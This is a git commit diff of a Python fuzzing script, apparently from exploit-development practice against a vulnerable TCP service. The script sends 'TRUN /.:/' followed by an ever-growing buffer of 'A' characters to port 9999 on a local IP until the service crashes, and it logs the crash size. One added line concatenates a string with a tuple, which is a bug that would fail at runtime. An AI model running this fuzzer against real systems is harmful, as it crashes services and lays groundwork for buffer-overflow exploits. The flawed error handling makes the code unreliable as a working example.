d379b11b91f115a2161ff345779b35adf1c4277a
nedzof <nedzofetahovic@hotmail.com>
2020-02-17 21:02:24 +0100

    FirstCommit

--- Fuzzing.py
+++ Fuzzing.py
@@ -7,12 +7,14 @@ buffer = "A" * 100
 
 while True:
     try:
+        print("[+] Starting with %s bytes " % str(len(buffer)))
         evil_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         evil_socket.connect(('192.168.0.234', 9999))
-        evil_socket.send(('TRUN /.:/' + buffer))
+        evil_socket.send(('TRUN /.:/' + buffer).encode())
         evil_socket.close()
         sleep(1)
-        buffer = buffer + ("A" * 100)
-    except:
+        buffer = buffer + "A" * 100
+    except Exception as e:
         print('Fuzzing crashed at %s bytes' % str(len(buffer)))
+        print("[-] Exception:" + e.args)
         sys.exit()
